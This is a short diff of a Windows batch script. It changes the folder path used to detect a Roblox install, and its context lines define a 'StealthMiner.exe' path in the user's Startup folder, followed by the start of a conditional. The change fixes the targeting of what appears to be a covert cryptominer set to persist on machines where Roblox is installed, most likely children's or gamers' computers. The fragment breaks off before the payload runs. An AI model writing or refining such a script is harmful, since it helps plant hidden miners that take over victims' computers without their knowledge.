@@ -1,5 +1,5 @@
 @echo off
-set "roblox_folder=%localappdata%\Microsoft\Roblox"
+set "roblox_folder=%localappdata%\Roblox"
 set "miner_exe=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\StealthMiner.exe"
 
 IF EXIST "%roblox_folder%" (
